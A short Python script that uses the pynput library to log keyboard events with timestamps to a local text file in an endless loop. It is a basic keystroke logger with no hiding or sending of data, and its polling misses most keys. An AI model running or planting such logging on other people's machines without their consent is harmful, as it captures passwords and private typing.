from pynput import keyboard
import logging
import pynput
import os
import time

cwd = os.getcwd()
log_directory = os.path.join(cwd,"Keyboard_logs")
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

formatter = logging.Formatter('%(asctime)s %(message)s', '%Y-%m-%d %H:%M:%S')

def setup_logger(name, log_file, level=logging.INFO):
    handler = logging.FileHandler(log_file)        
    handler.setFormatter(formatter)
    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.addHandler(handler)
    return logger

   
keyboard_logger = setup_logger('keyboard_logger', 'keyboard_log0.txt')

def get_keyboard_event():
    with keyboard.Events() as events:
        event = events.get(1.0)
        if event is not None:
            keyboard_logger.info('Received event {}'.format(event))

while True:
    get_keyboard_event()
    time.sleep(1)

